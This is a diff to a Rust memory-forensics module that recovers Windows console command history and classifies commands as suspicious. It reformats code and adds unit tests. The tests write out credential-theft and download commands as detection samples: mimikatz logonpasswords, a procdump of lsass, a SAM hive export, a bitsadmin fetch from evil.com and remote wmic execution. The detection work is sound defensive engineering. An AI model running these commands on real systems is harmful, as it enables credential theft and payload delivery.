@@ -77,7 +77,11 @@ pub fn classify_console_command(command: &str) -> bool {
     // Detect base64-like long arguments (common in encoded payloads).
     // Split on whitespace and check for any token >80 chars that looks base64.
     for token in command.split_whitespace() {
-        if token.len() > 80 && token.chars().all(|c| c.is_ascii_alphanumeric() || c == '+' || c == '/' || c == '=') {
+        if token.len() > 80
+            && token
+                .chars()
+                .all(|c| c.is_ascii_alphanumeric() || c == '+' || c == '/' || c == '=')
+        {
             return true;
         }
     }
@@ -140,7 +144,8 @@ pub fn walk_consoles<P: PhysicalMemoryProvider + Clone>(
         let pid = proc.pid as u32;
         let proc_name = proc.image_name.clone();
 
-        if let Ok(commands) = extract_console_commands(&proc_reader, pid, &proc_name, proc.peb_addr) {
+        if let Ok(commands) = extract_console_commands(&proc_reader, pid, &proc_name, proc.peb_addr)
+        {
             results.extend(commands);
         }
     }
@@ -224,11 +229,7 @@ fn extract_console_commands<P: PhysicalMemoryProvider>(
         // Walk the HistoryList doubly-linked list.
         let history_list_head = console_addr.wrapping_add(hist_list_off);
 
-        let history_entries = walk_history_list(
-            reader,
-            history_list_head,
-            cmd_hist_list_off,
-        );
+        let history_entries = walk_history_list(reader, history_list_head, cmd_hist_list_off);
 
         for hist_addr in history_entries {
             // Read ApplicationName (_UNICODE_STRING).
@@ -238,9 +239,7 @@ fn extract_console_commands<P: PhysicalMemoryProvider>(
             // Read command count.
             let cmd_count_raw: u32 = reader
                 .read_field(hist_addr, "_COMMAND_HISTORY", "CommandCount")
-                .unwrap_or_else(|_| {
-                    read_u32(reader, hist_addr.wrapping_add(cmd_hist_count_off))
-                });
+                .unwrap_or_else(|_| read_u32(reader, hist_addr.wrapping_add(cmd_hist_count_off)));
             let cmd_count = (cmd_count_raw as usize).min(MAX_COMMANDS_PER_HISTORY);
 
             // Read pointer to command bucket (array of pointers to _COMMAND).
@@ -335,11 +334,7 @@ fn scan_for_console_info<P: PhysicalMemoryProvider>(
         // For user-mode: addresses typically < 0x0000_8000_0000_0000
         // For kernel-mode: addresses typically > 0xFFFF_8000_0000_0000
         // We check that both pointers are in the same address space half and non-null.
-        if flink != 0
-            && blink != 0
-            && is_plausible_pointer(flink)
-            && is_plausible_pointer(blink)
-        {
+        if flink != 0 && blink != 0 && is_plausible_pointer(flink) && is_plausible_pointer(blink) {
             // Verify the list is self-consistent: flink->blink should point back.
             let candidate_addr = base_addr.wrapping_add(offset as u64);
             let head_addr = candidate_addr.wrapping_add(hist_list_off);
@@ -347,9 +342,8 @@ fn scan_for_console_info<P: PhysicalMemoryProvider>(
             // Read flink->blink and check it points back to our list head.
             if let Ok(flink_blink) = reader.read_bytes(flink.wrapping_add(8), 8) {
                 if flink_blink.len() == 8 {
-                    let flink_blink_val = u64::from_le_bytes(
-                        flink_blink[..8].try_into().unwrap_or([0; 8]),
-                    );
+                    let flink_blink_val =
+                        u64::from_le_bytes(flink_blink[..8].try_into().unwrap_or([0; 8]));
                     if flink_blink_val == head_addr {
                         found.push(candidate_addr);
                     }
@@ -465,23 +459,63 @@ mod tests {
         assert!(!classify_console_command("cd C:\\Users\\admin\\Documents"));
     }
 
+    /// A normal `dir` command is benign.
+    #[test]
+    fn classify_dir_benign() {
+        assert!(!classify_console_command("dir /s /b C:\\Windows"));
+    }
+
+    /// A normal `type` command is benign.
+    #[test]
+    fn classify_type_benign() {
+        assert!(!classify_console_command("type file.txt"));
+    }
+
+    /// An empty command is benign.
+    #[test]
+    fn classify_empty_benign() {
+        assert!(!classify_console_command(""));
+    }
+
     /// `net user` enumeration is suspicious.
     #[test]
     fn classify_net_user_suspicious() {
         assert!(classify_console_command("net user administrator"));
     }
 
+    /// `net localgroup` enumeration is suspicious.
+    #[test]
+    fn classify_net_localgroup_suspicious() {
+        assert!(classify_console_command("net localgroup Administrators"));
+    }
+
+    /// `whoami` reconnaissance is suspicious.
+    #[test]
+    fn classify_whoami_suspicious() {
+        assert!(classify_console_command("whoami /all"));
+    }
+
     /// `mimikatz` is suspicious regardless of arguments.
     #[test]
     fn classify_mimikatz_suspicious() {
-        assert!(classify_console_command("mimikatz.exe sekurlsa::logonpasswords"));
+        assert!(classify_console_command(
+            "mimikatz.exe sekurlsa::logonpasswords"
+        ));
     }
 
-    /// `powershell -enc` with encoded payload is suspicious.
+    /// `procdump` against lsass is suspicious.
     #[test]
-    fn classify_powershell_enc_suspicious() {
+    fn classify_procdump_suspicious() {
         assert!(classify_console_command(
-            "powershell -enc ZQBjAGgAbwAgACIASABlAGwAbABvACIA"
+            "procdump -ma lsass.exe lsass.dmp"
+        ));
+    }
+
+    /// `reg save` hive export is suspicious.
+    #[test]
+    fn classify_reg_save_suspicious() {
+        assert!(classify_console_command(
+            "reg save HKLM\\SAM C:\\Temp\\sam.hive"
         ));
     }
 
@@ -493,11 +527,144 @@ mod tests {
         ));
     }
 
-    /// An empty command is benign.
+    /// `powershell -enc` with encoded payload is suspicious.
     #[test]
-    fn classify_empty_benign() {
-        assert!(!classify_console_command(""));
+    fn classify_powershell_enc_suspicious() {
+        assert!(classify_console_command(
+            "powershell -enc ZQBjAGgAbwAgACIASABlAGwAbABvACIA"
+        ));
     }
+
+    /// `bitsadmin /transfer` download is suspicious.
+    #[test]
+    fn classify_bitsadmin_suspicious() {
+        assert!(classify_console_command(
+            "bitsadmin /transfer job1 http://evil.com/payload.exe C:\\temp\\payload.exe"
+        ));
+    }
+
+    /// `wmic /node:` remote execution is suspicious.
+    #[test]
+    fn classify_wmic_remote_suspicious() {
+        assert!(classify_console_command(
+            "wmic /node:192.168.1.100 process call create cmd.exe"
+        ));
+    }
+
+    /// Pattern matching is case-insensitive.
+    #[test]
+    fn classify_case_insensitive() {
+        assert!(classify_console_command("NET USER admin"));
+        assert!(classify_console_command("MIMIKATZ.EXE"));
+        assert!(classify_console_command("WHOAMI /all"));
+    }
+
+    /// Base64-like long argument (>80 chars) triggers detection.
+    #[test]
+    fn classify_base64_long_argument_suspicious() {
+        // Construct a 90-char base64-like token
+        let long_b64 = "A".repeat(81);
+        let cmd = format!("powershell {}", long_b64);
+        assert!(classify_console_command(&cmd));
+    }
+
+    /// Long but non-base64 argument is benign.
+    #[test]
+    fn classify_long_non_base64_benign() {
+        // Long argument with spaces (not a single token) — not suspicious
+        let long_path = format!("dir C:\\{}", "a".repeat(90));
+        // This has spaces so "dir" and the path are two tokens; the path token itself
+        // contains only a-z and backslash (not pure base64), so benign.
+        // Actually backslash isn't in base64 so the long token won't match
+        assert!(!classify_console_command(&long_path));
+    }
+
+    /// Exactly 80-char token is NOT flagged (needs >80).
+    #[test]
+    fn classify_exactly_80_char_token_benign() {
+        let token_80 = "A".repeat(80);
+        let cmd = format!("run {}", token_80);
+        assert!(!classify_console_command(&cmd));
+    }
+
+    /// Exactly 81-char base64 token IS flagged.
+    #[test]
+    fn classify_exactly_81_char_base64_suspicious() {
+        let token_81 = "A".repeat(81);
+        let cmd = format!("run {}", token_81);
+        assert!(classify_console_command(&cmd));
+    }
+
+    // ---------------------------------------------------------------
+    // is_plausible_pointer tests
+    // ---------------------------------------------------------------
+
+    #[test]
+    fn plausible_pointer_null_rejected() {
+        assert!(!is_plausible_pointer(0));
+    }
+
+    #[test]
+    fn plausible_pointer_canonical_user_mode() {
+        // Valid user-mode pointer (bits 48..63 = 0)
+        assert!(is_plausible_pointer(0x0000_7FFF_FFFF_F000));
+        assert!(is_plausible_pointer(0x0000_0000_0001_0000));
+    }
+
+    #[test]
+    fn plausible_pointer_canonical_kernel_mode() {
+        // Valid kernel-mode pointer (bits 47..63 all 1s, upper = 0x1_FFFF)
+        assert!(is_plausible_pointer(0xFFFF_8000_0000_0000));
+        assert!(is_plausible_pointer(0xFFFF_FFFF_FFFF_F000));
+    }
+
+    #[test]
+    fn plausible_pointer_non_canonical_rejected() {
+        // Non-canonical: bits 48..63 are not all-zero or all-one
+        // e.g. 0x0001_0000_0000_0000 (upper >> 47 = 2, not 0 or 0x1_FFFF)
+        assert!(!is_plausible_pointer(0x0001_0000_0000_0000));
+        assert!(!is_plausible_pointer(0x8000_0000_0000_0000));
+    }
+
+    // ---------------------------------------------------------------
+    // ConsoleHistoryInfo struct and serialization tests
+    // ---------------------------------------------------------------
+
+    #[test]
+    fn console_history_info_construction() {
+        let info = ConsoleHistoryInfo {
+            pid: 1234,
+            process_name: "conhost.exe".to_string(),
+            application: "cmd.exe".to_string(),
+            command: "whoami /all".to_string(),
+            command_index: 0,
+            is_suspicious: true,
+        };
+        assert_eq!(info.pid, 1234);
+        assert_eq!(info.process_name, "conhost.exe");
+        assert!(info.is_suspicious);
+    }
+
+    #[test]
+    fn console_history_info_serialization() {
+        let info = ConsoleHistoryInfo {
+            pid: 456,
+            process_name: "csrss.exe".to_string(),
+            application: "cmd.exe".to_string(),
+            command: "dir".to_string(),
+            command_index: 2,
+            is_suspicious: false,
+        };
+        let json = serde_json::to_string(&info).unwrap();
+        assert!(json.contains("\"pid\":456"));
+        assert!(json.contains("\"is_suspicious\":false"));
+        assert!(json.contains("\"command\":\"dir\""));
+        assert!(json.contains("\"command_index\":2"));
+    }
+
+    // ---------------------------------------------------------------
+    // walk_consoles: no PsActiveProcessHead → empty results
+    // ---------------------------------------------------------------
 
     /// When PsActiveProcessHead is not in symbols, walker returns empty.
     #[test]
@@ -524,6 +691,31 @@ mod tests {
         let reader = ObjectReader::new(vas, Box::new(resolver));
 
         let results = walk_consoles(&reader).unwrap();
-        assert!(results.is_empty(), "no PsActiveProcessHead should yield empty results");
+        assert!(
+            results.is_empty(),
+            "no PsActiveProcessHead should yield empty results"
+        );
+    }
+
+    // ---------------------------------------------------------------
+    // Constants
+    // ---------------------------------------------------------------
+
+    #[test]
+    fn scan_window_size_reasonable() {
+        assert!(SCAN_WINDOW_SIZE >= 64 * 1024);
+        assert!(SCAN_WINDOW_SIZE <= 4 * 1024 * 1024);
+    }
+
+    #[test]
+    fn console_host_names_includes_conhost() {
+        assert!(CONSOLE_HOST_NAMES.contains(&"conhost.exe"));
+        assert!(CONSOLE_HOST_NAMES.contains(&"csrss.exe"));
+    }
+
+    #[test]
+    fn max_history_entries_reasonable() {
+        assert!(MAX_HISTORY_ENTRIES > 0);
+        assert!(MAX_COMMANDS_PER_HISTORY > 0);
     }
 }
